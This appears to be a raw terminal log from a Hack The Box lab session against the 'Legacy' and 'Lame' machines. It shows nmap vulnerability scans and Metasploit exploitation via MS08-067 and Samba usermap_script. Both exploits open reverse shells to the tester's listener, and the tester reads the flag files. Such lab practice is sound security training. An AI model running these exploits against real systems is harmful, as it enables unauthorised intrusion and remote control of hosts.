TODO:

REDO ALL NMAPs!!!

Lame: Review
Legacy: Review


LEGACY:

hippoeug@kali:~$ nmap 10.129.120.139 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 06:04 +08
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:05
Completed NSE at 06:05, 0.00s elapsed
Initiating NSE at 06:05
Completed NSE at 06:05, 0.00s elapsed
Initiating NSE at 06:05
Completed NSE at 06:05, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:05
Completed Parallel DNS resolution of 1 host. at 06:05, 0.03s elapsed
Initiating Connect Scan at 06:05
Scanning 10.129.120.139 [1000 ports]
Discovered open port 445/tcp on 10.129.120.139
Discovered open port 139/tcp on 10.129.120.139
Completed Connect Scan at 06:05, 18.24s elapsed (1000 total ports)
Initiating Service scan at 06:05
Scanning 2 services on 10.129.120.139
Completed Service scan at 06:05, 7.24s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.120.139.
Initiating NSE at 06:05
Completed NSE at 06:06, 52.71s elapsed
Initiating NSE at 06:06
Completed NSE at 06:06, 0.00s elapsed
Initiating NSE at 06:06
Completed NSE at 06:06, 0.00s elapsed
Nmap scan report for 10.129.120.139
Host is up (0.31s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m51s, deviation: 2h07m16s, median: 4d22h57m51s
| nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:de:49 (VMware)
| Names:
|_  
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-05-03T03:03:18+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
Initiating NSE at 06:06
Completed NSE at 06:06, 0.00s elapsed
Initiating NSE at 06:06
Completed NSE at 06:06, 0.00s elapsed
Initiating NSE at 06:06
Completed NSE at 06:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.84 seconds
hippoeug@kali:~$ nmap --script vuln 10.129.120.139 -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 06:07 +08
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:07
Completed NSE at 06:07, 10.00s elapsed
Initiating NSE at 06:07
Completed NSE at 06:07, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:07
Completed Parallel DNS resolution of 1 host. at 06:07, 0.00s elapsed
Initiating Connect Scan at 06:07
Scanning 10.129.120.139 [1000 ports]
Discovered open port 445/tcp on 10.129.120.139
Discovered open port 139/tcp on 10.129.120.139
Completed Connect Scan at 06:08, 28.57s elapsed (1000 total ports)
NSE: Script scanning 10.129.120.139.
Initiating NSE at 06:08
NSE: [tls-ticketbleed] Not running due to lack of privileges.
NSE: [firewall-bypass] lacks privileges.
Completed NSE at 06:08, 15.86s elapsed
Initiating NSE at 06:08
Completed NSE at 06:08, 0.00s elapsed
Nmap scan report for 10.129.120.139
Host is up (0.32s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

NSE: Script Post-scanning.
Initiating NSE at 06:08
Completed NSE at 06:08, 0.00s elapsed
Initiating NSE at 06:08
Completed NSE at 06:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.88 seconds
hippoeug@kali:~$ 










hippoeug@kali:~$ msfconsole
                                                  

  Metasploit Park, System Security Interface                                                                                                                          
  Version 4.0.5, Alpha E                                                                                                                                              
  Ready...                                                                                                                                                            
  > access security                                                                                                                                                   
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                      
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                      
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                      
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                      
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                      
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                      


       =[ metasploit v6.0.29-dev                          ]
+ -- --=[ 2098 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

msf6 > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.129.120.139
rhosts => 10.129.120.139
msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.14.6
lhost => 10.10.14.6
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] 10.129.120.139:445 - Automatically detecting the target...
[*] 10.129.120.139:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.120.139:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.120.139:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.129.120.139
[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.129.120.139:1044) at 2021-04-28 06:12:27 +0800

meterpreter > search -f *.txt
Found 42 results...
    c:\Documents and Settings\Administrator\Application Data\Microsoft\Internet Explorer\brndlog.txt (10389 bytes)
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
    c:\Documents and Settings\Administrator\Local Settings\Temp\dd_vcredistMSI2F1B.txt (529446 bytes)
    c:\Documents and Settings\Administrator\Local Settings\Temp\dd_vcredistUI2F1B.txt (11702 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\manifest.txt (4334 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\adobeflashcs3.txt (1433 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\adobephotoshopcs3.txt (1712 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\googledesktop.txt (588 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\microsoftoffice.txt (1265 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\vistasidebar.txt (907 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\visualstudio2005.txt (152 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\vmwarefilters.txt (3084 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\win7gadgets.txt (399 bytes)
    c:\Documents and Settings\Default User\Application Data\Microsoft\Internet Explorer\brndlog.txt (141 bytes)
    c:\Documents and Settings\john\Application Data\Microsoft\Internet Explorer\brndlog.txt (10380 bytes)
    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
    c:\Program Files\Movie Maker\Shared\Empty.txt (18 bytes)
    c:\Program Files\Movie Maker\Shared\Profiles\Blank.txt (21 bytes)
    c:\Program Files\Outlook Express\msoe.txt (133 bytes)
    c:\Program Files\VMware\VMware Tools\open_source_licenses.txt (762285 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\drivetable.txt (130 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP1\drivetable.txt (130 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP1\snapshot\domain.txt (26 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP2\drivetable.txt (130 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP2\snapshot\domain.txt (26 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP3\snapshot\domain.txt (26 bytes)
    c:\WINDOWS\OEWABLog.txt (1178 bytes)
    c:\WINDOWS\SchedLgU.Txt (2024 bytes)
    c:\WINDOWS\setuplog.txt (747894 bytes)
    c:\WINDOWS\Help\Tours\mmTour\intro.txt (807 bytes)
    c:\WINDOWS\Help\Tours\mmTour\nav.txt (407 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment1.txt (747 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment2.txt (772 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment3.txt (717 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment4.txt (633 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment5.txt (799 bytes)
    c:\WINDOWS\system32\eula.txt (29338 bytes)
    c:\WINDOWS\system32\h323log.txt
    c:\WINDOWS\system32\CatRoot2\dberr.txt (4015 bytes)
    c:\WINDOWS\system32\config\systemprofile\Application Data\Microsoft\Internet Explorer\brndlog.txt (141 bytes)
    c:\WINDOWS\system32\drivers\gmreadme.txt (646 bytes)
    c:\WINDOWS\system32\Restore\MachineGuid.txt (78 bytes)
meterpreter > pwd
C:\WINDOWS\system32
meterpreter > cd ..
cmeterpreter > cd ..
meterpreter > ls
[-] Error running command ls: NoMethodError undefined method `[]' for nil:NilClass
meterpreter > shell
Process 2032 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
16/03/2017  08:30 ��                 0 CONFIG.SYS
16/03/2017  09:07 ��    <DIR>          Documents and Settings
29/12/2017  11:41 ��    <DIR>          Program Files
03/06/2020  09:49 ��    <DIR>          WINDOWS
               2 File(s)              0 bytes
               3 Dir(s)   6.297.468.928 bytes free

C:\>cd "Documents and Settings"
cd "Documents and Settings"

C:\Documents and Settings>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.297.464.832 bytes free

C:\Documents and Settings>cd john
cd john

C:\Documents and Settings\john>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john

16/03/2017  08:33 ��    <DIR>          .
16/03/2017  08:33 ��    <DIR>          ..
16/03/2017  09:19 ��    <DIR>          Desktop
16/03/2017  08:33 ��    <DIR>          Favorites
16/03/2017  08:33 ��    <DIR>          My Documents
16/03/2017  08:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.297.464.832 bytes free

C:\Documents and Settings\john>cd Desktop
cd Desktop

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��    <DIR>          .
16/03/2017  09:19 ��    <DIR>          ..
16/03/2017  09:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.464.832 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
C:\Documents and Settings\john\Desktop>cd ..
cd ..

C:\Documents and Settings\john>cd ..
cd ..

C:\Documents and Settings>cd Administrator
cd Administrator

C:\Documents and Settings\Administrator>type root.txt
type root.txt
The system cannot find the file specified.

C:\Documents and Settings\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:18 ��    <DIR>          Desktop
16/03/2017  09:07 ��    <DIR>          Favorites
16/03/2017  09:07 ��    <DIR>          My Documents
16/03/2017  08:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.297.460.736 bytes free

C:\Documents and Settings\Administrator>cd Deesktop
cd Deesktop
The system cannot find the path specified.

C:\Documents and Settings\Administrator>cd Desktop
cd Desktop

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18 ��    <DIR>          .
16/03/2017  09:18 ��    <DIR>          ..
16/03/2017  09:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.456.640 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop>



LAME: 

hippoeug@kali:~$ nmap 10.129.137.142 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 06:24 +08
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:24
Completed NSE at 06:24, 0.00s elapsed
Initiating NSE at 06:24
Completed NSE at 06:24, 0.00s elapsed
Initiating NSE at 06:24
Completed NSE at 06:24, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:24
Completed Parallel DNS resolution of 1 host. at 06:24, 0.03s elapsed
Initiating Connect Scan at 06:24
Scanning 10.129.137.142 [1000 ports]
Discovered open port 139/tcp on 10.129.137.142
Discovered open port 21/tcp on 10.129.137.142
Discovered open port 22/tcp on 10.129.137.142
Discovered open port 445/tcp on 10.129.137.142
Completed Connect Scan at 06:25, 16.40s elapsed (1000 total ports)
Initiating Service scan at 06:25
Scanning 4 services on 10.129.137.142
Completed Service scan at 06:25, 11.94s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.137.142.
Initiating NSE at 06:25
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 06:25, 40.16s elapsed
Initiating NSE at 06:25
Completed NSE at 06:25, 2.16s elapsed
Initiating NSE at 06:25
Completed NSE at 06:25, 0.00s elapsed
Nmap scan report for 10.129.137.142
Host is up (0.31s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m47s, deviation: 2h49m44s, median: 45s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-04-27T18:26:05-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
Initiating NSE at 06:25
Completed NSE at 06:25, 0.00s elapsed
Initiating NSE at 06:25
Completed NSE at 06:25, 0.00s elapsed
Initiating NSE at 06:25
Completed NSE at 06:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.19 seconds
hippoeug@kali:~$ nmap --script vuln 10.129.137.142 -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 06:27 +08
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:27
Completed NSE at 06:27, 10.00s elapsed
Initiating NSE at 06:27
Completed NSE at 06:27, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:27
Completed Parallel DNS resolution of 1 host. at 06:27, 0.00s elapsed
Initiating Connect Scan at 06:27
Scanning 10.129.137.142 [1000 ports]
Discovered open port 445/tcp on 10.129.137.142
Discovered open port 139/tcp on 10.129.137.142
Discovered open port 22/tcp on 10.129.137.142
Discovered open port 21/tcp on 10.129.137.142
Completed Connect Scan at 06:27, 17.04s elapsed (1000 total ports)
NSE: Script scanning 10.129.137.142.
Initiating NSE at 06:27
NSE: [tls-ticketbleed] Not running due to lack of privileges.
NSE: [firewall-bypass] lacks privileges.
Completed NSE at 06:30, 169.30s elapsed
Initiating NSE at 06:30
Completed NSE at 06:30, 0.00s elapsed
Nmap scan report for 10.129.137.142
Host is up (0.31s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
|_sslv2-drown: 
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)

NSE: Script Post-scanning.
Initiating NSE at 06:30
Completed NSE at 06:30, 0.00s elapsed
Initiating NSE at 06:30
Completed NSE at 06:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 196.76 seconds
hippoeug@kali:~$ msfconsole
                                                  

                 _---------.                                                                                                                                          
             .' #######   ;."                                                                                                                                         
  .---,.    ;@             @@`;   .---,..                                                                                                                             
." @@@@@'.,'@@            @@@@@',.'@@@@ ".                                                                                                                            
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;                                                                                                                            
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'                                                                                                                            
     "--'.@@@  -.@        @ ,'-   .'--"                                                                                                                               
          ".@' ; @       @ `.  ;'                                                                                                                                     
            |@@@@ @@@     @    .                                                                                                                                      
             ' @@@ @@   @@    ,                                                                                                                                       
              `.@@@@    @@   .                                                                                                                                        
                ',@@     @   ;           _____________                                                                                                                
                 (   3 C    )     /|___ / Metasploit! \                                                                                                               
                 ;@'. __*__,."    \|--- \_____________/                                                                                                               
                  '(.,...."/                                                                                                                                          


       =[ metasploit v6.0.29-dev                          ]
+ -- --=[ 2098 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use help <command> to learn more 
about any command

msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > show options

Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/ftp/anonymous) > set rhost 10.129.137.142
rhost => 10.129.137.142
msf6 auxiliary(scanner/ftp/anonymous) > run

[+] 10.129.137.142:21     - 10.129.137.142:21 - Anonymous READ (220 (vsFTPd 2.3.4))
[*] 10.129.137.142:21     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ftp/anonymous) > exit
hippoeug@kali:~$ nc 10.129.137.142 21
220 (vsFTPd 2.3.4)
^C
hippoeug@kali:~$ msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __                                                                                                           
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                                                                                          
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                                                                                         
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                                                                                         
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                                                                                        
                                                                                                                                                                      

       =[ metasploit v6.0.29-dev                          ]
+ -- --=[ 2098 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Display the Framework log using the 
log command, learn more with help log

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.129.137.142
rhosts => 10.129.137.142
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.129.137.142:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.137.142:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > Interrupt: use the 'exit' command to quit
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
[3]+  Stopped                 msfconsole
hippoeug@kali:~$ ftp 10.10.10.3
ftp: connect: Connection timed out
ftp> ^C
ftp> ^Z
[4]+  Stopped                 ftp 10.10.10.3
hippoeug@kali:~$ ftp 10.129.137.142
Connected to 10.129.137.142.
220 (vsFTPd 2.3.4)
Name (10.129.137.142:hippoeug): 123456:)
331 Please specify the password.
Password:
500 OOPS: priv_sock_get_result
Login failed.
421 Service not available, remote server has closed connection
ftp> ^C
ftp> ^Z
[5]+  Stopped                 ftp 10.129.137.142
hippoeug@kali:~$ ftp 10.129.137.142
Connected to 10.129.137.142.
220 (vsFTPd 2.3.4)
Name (10.129.137.142:hippoeug): user:)
331 Please specify the password.
Password:
421 Service not available, remote server has closed connection
Login failed.
No control connection for command: Success
ftp> nc -vn 10.129.137.142 6200
?Invalid command
ftp> 

hippoeug@kali:~$ nc -vn 10.129.137.142 6200
(UNKNOWN) [10.129.137.142] 6200 (?) : Connection timed out
hippoeug@kali:~$ 

hippoeug@kali:~$ msfconsole
                                                  

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       =[ metasploit v6.0.29-dev                          ]
+ -- --=[ 2098 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------                                                                                                                     
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.204.129  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > set rhosts 10.129.137.142
rhosts => 10.129.137.142
msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.6
lhost => 10.10.14.6
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.129.137.142:53572) at 2021-04-28 06:40:00 +0800



whoamo
/bin/sh: line 3: whoamo: command not found
pwd
/home/makis
ls
user.txt
cat user.txt
6e66e5335b097cba8de6320509cd6c9e
pwd
/root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
01208cdc186f839cce0ddca1bb8920d6

